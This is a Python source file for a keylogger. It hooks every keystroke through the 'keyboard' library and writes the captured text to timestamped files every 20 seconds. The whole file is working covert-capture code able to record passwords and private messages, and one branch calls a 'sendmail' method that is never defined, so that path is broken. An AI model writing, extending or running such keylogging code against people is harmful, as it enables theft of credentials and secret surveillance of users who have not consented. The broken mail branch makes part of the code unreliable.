import keyboard # for keylogs
# Timer is to make a method runs after an interval amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 20 # in seconds



class Keylogger:

    def __init__(self, interval, report_method="file"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()



    def callback(self, event):
       
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    


    def update_filename(self):

        # the filename with start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"



    def report_to_file(self):

        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")



    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "":
                self.sendmail(self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # start the timer
        timer.start()



    def start(self):

        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # a simple message
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    

if __name__ == "__main__":

    # keylogger to record keylogs to a local file 
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
